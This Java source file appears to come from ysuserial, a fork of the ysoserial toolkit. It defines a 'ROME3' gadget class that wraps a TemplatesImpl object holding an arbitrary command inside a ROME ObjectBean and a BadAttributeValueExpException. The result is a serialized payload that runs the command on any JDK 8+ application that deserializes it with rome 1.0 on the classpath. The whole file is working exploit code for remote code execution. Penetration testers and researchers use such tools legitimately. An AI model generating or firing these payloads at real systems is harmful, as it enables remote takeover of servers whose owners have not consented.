package org.su18.ysuserial.payloads.gadgets;


import com.sun.syndication.feed.impl.ObjectBean;
import org.su18.ysuserial.payloads.ObjectPayload;
import org.su18.ysuserial.payloads.annotation.Authors;
import org.su18.ysuserial.payloads.annotation.Dependencies;
import org.su18.ysuserial.payloads.util.Gadgets;
import org.su18.ysuserial.payloads.util.Reflections;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;


/**
 * JDK 8+
 */
@Dependencies("rome:rome:1.0")
@Authors({"Firebasky"})
public class ROME3 implements ObjectPayload<Object> {

	public Object getObject(String command) throws Exception {
		Object                        o        = Gadgets.createTemplatesImpl(command);
		ObjectBean                    delegate = new ObjectBean(Templates.class, o);
		BadAttributeValueExpException b        = new BadAttributeValueExpException("");
		Reflections.setFieldValue(b, "val", delegate);
		return b;
	}
}
